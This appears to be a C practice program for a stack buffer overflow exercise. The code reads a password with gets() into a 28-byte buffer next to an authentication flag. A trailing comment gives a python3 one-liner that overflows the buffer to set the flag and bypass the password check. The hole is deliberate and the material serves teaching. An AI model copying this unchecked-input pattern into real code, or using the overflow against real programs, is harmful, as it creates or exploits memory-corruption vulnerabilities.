#include <stdio.h>
#define goodPass "GOODPASS"

int main() {
    char passIsGood = 0;
    char buf[28];

    printf("buf : %p, &passIsGood : %p\n", buf, &passIsGood);
    printf("Enter password: \n");
    gets(buf);

    if(strcmp(buf,goodPass)==0) passIsGood = 1;
    if(passIsGood == 1) printf("you win!\n");
}

//python3 -c "print('x'*28 + '\x01')" | ./stack2